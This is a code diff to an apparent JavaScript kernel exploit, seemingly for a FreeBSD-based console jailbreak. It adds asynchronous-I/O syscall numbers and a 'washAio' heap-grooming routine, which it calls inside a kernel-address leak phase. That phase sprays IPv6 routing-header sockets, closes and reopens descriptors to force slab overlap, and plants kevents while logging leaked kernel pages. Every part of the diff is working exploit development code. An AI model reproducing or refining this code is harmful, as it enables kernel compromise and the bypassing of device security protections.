@@ -11,6 +11,11 @@ const NUM = {
   kqueue: 362, kevent: 363,
   mmap: 477, munmap: 73,
   jitshm_create: 533,
+  aio_multi_delete: 662,
+  aio_multi_wait: 663,
+  aio_multi_poll: 664,
+  aio_multi_cancel: 666,
+  aio_submit_cmd: 669,
 };
 const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
 const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
@@ -200,6 +205,49 @@ function phaseSpray(N) {
   return { fds, rth };
 }
 
+// --- AIO WASH (from Java exploit) ---
+let aio_bufs = null;
+function washAio() {
+  if (!aio_bufs) {
+    aio_bufs = {
+      req: allocBuf(5 * 40),
+      subSt: allocBuf(5 * 4),
+      canSt: allocBuf(5 * 4),
+      waiSt: allocBuf(5 * 4),
+      polSt: allocBuf(5 * 4),
+      to: allocBuf(8)
+    };
+    for (let i = 0; i < 5; i++) {
+      aio_bufs.req.dv.setUint32(i * 40 + 8, 0, true);
+      aio_bufs.req.dv.setInt32(i * 40 + 32, -1, true);
+    }
+    aio_bufs.to.dv.setUint32(0, 1000, true);
+  }
+  
+  for (let iter = 0; iter < 32; iter++) {
+    aio_bufs.subSt.u8.fill(0);
+    scn("aio_submit_cmd", 4097, aio_bufs.req.addr, 5, 3, aio_bufs.subSt.addr);
+    
+    aio_bufs.waiSt.u8.fill(0);
+    scn("aio_multi_wait", aio_bufs.subSt.addr, 5, aio_bufs.waiSt.addr, 0, aio_bufs.to.addr);
+    
+    for (let r = 0; r < 4; r++) {
+      aio_bufs.polSt.u8.fill(0);
+      scn("aio_multi_poll", aio_bufs.subSt.addr, 5, aio_bufs.polSt.addr);
+      
+      aio_bufs.canSt.u8.fill(0);
+      scn("aio_multi_cancel", aio_bufs.subSt.addr, 5, aio_bufs.canSt.addr);
+      
+      let remaining = 0;
+      for (let i = 0; i < 5; i++) {
+        if (aio_bufs.canSt.dv.getInt32(i * 4, true) !== 0) remaining++;
+      }
+      if (remaining === 0) break;
+    }
+  }
+}
+// ------------------------------------
+
 function phase2Leak(rootKq, fds) {
   const rdb = allocBuf(512);
   const lenp = allocBuf(8);
@@ -213,14 +261,16 @@ function phase2Leak(rootKq, fds) {
   let kva = -1n, pageVal = 0n;
   let tries = 0;
 
-  // Brute-force scan all 256 slots
   for (let attempt = 1; attempt <= 6; attempt++) {
     if (target >= 0) break;
     log("KV-ATTEMPT", attempt + "/6");
     
-    // Repack all sockets
     for (const fd of fds) { if (fd !== -1) disarm(fd); }
     for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
+    
+    // Run AIO Wash before the candidates
+    log("KV-WASH", "washing...");
+    washAio();
 
     for (let vi = 0; vi < fds.length && target < 0; vi++) {
       const fd = fds[vi];
@@ -232,8 +282,12 @@ function phase2Leak(rootKq, fds) {
       scn("close", fd);
       fds[vi] = -1; 
       
+      // Open DCE
       const dce = scn("open", dev.addr, 2, 0, 0, 0, 0); 
       if (dce < 0) continue;
+      
+      // Run AIO wash again to force slab overlap
+      washAio();
       
       const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
       const pageInt = Number(page & 0xffffffffn) | 0;
@@ -247,10 +301,7 @@ function phase2Leak(rootKq, fds) {
       let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
       log("KV-PLANT", "idx=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
       
-      if (rc !== 0) {
-        // If plant failed, re-open dce to keep fd numbers consistent
-        continue; 
-      }
+      if (rc !== 0) continue; 
 
       let joined = 0;
       for (let j = 0; j < fds.length; j++) {
